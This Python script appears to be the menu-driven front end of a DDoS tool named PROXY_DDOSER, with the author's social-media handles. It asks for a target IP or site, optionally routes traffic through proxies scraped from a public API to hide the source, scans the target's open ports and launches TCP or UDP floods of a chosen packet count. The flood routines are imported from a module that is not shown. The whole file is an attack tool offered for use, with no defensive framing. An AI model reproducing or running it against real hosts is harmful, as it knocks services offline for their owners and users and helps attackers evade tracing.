from Classes import DDOS , Load_Automaticaly_Proxy , proxy_sender 
print('\n\n\n')
print('\x1b[6;30;42m','Github : www.github.com/amiralirj ', '\x1b[0m')
print(' instagram : @amiralirj \n telegram : @amiralirj_pv \n\n')
#-------------------------------------------------------------------------------------------------------------
text=input('hello welcome to PROXY_DDOSER ! do you want to get proxies automatically ? y/n     ⟹: ')
if text.lower()=='y':
    try:
        Load_Automaticaly_Proxy()
        print('Proxies are Cheaking automatically ! Please wait for 30-40 seconds to find proxies !')
    except ConnectionError :print('Problem occurred! CANT CONNECT TO (api.proxyscrape.com) ! PLEASE TRY VPN ')
#-------------------------------------------------------------------------------------------------------------
while True:
    text=input('Send Your target ip or site address      ⟹:')
    try:site=DDOS(text.replace('https://','').replace('http://',''))
    except ConnectionAbortedError:
        print('Cant Connect to site !')
        continue
    except:
        print('Problem occurred!')
        continue
    text=input('What do you want to do ? \n  DDOS Attack : 1 |   Cheak site active ports : 2      ⟹: ')
    if text=='exit':continue
    if text.isdigit():
        if int(text) ==1:
            text=input('attacking with proxy ? y/n     ⟹:')
            if text=='exit':continue
            elif text =='y':
                proxy=True
                print('please wait for cheak active proxy')
                try:
                    proxy_sender()
                except:text=input('no proxy Founded ! For get proxy from proxy part and try again ! OR  DO YOU WANT TO ATTACK WITHOUT PROXY ? y/n    ⟹: ')
                if text=='n':continue
                else:proxy=False
            else:proxy=False
            text=input('TCP attack : 1 | UDP attack (recommended) : 2    ⟹: ')
            if text=='exit':continue
            if text.isdigit():
                if int(text) ==1:
                    UDP=False
                    attack_kind='TCP'
                elif int(text) ==2:
                    UDP=True
                    attack_kind='UDP'
                if site.Common_Ports_Cheacker() == []:
                    text=input('NONE active port found ! do you want to continue with testing all ports (this may take while) ? y/n    ⟹: ')
                    if text.lower()=='n':continue
                    else:site.All_Port_Cheaker()
                text=input(f'Attack Details : \n UDP-TCP Attack : ({attack_kind}) \n Proxy : {proxy} \n For accept this details write packet number which will Send to the server , for exit write n    ⟹:')
                if text.isdigit():
                    site.Attack(int(text),proxy,UDP)
                    print('Attack Finished !')
                else:continue

        elif int(text) ==2:
            text=input('cheak all active ports 1 (This may take a while) | Cheak Common ports 2     ⟹: ')
            if text.isdigit():
                if int(text) == 1:site.All_Port_Cheaker()
                elif int(text) == 2:site.Common_Ports_Cheacker()
                else:print('ONLY 1 or 2 :)')
            else:print('PLEASE ENTER DIGIT (1,2)')
        else:print('ONLY 1 or 2 :)')
    else:print('PLEASE ENTER DIGIT (1,2)')
        

                        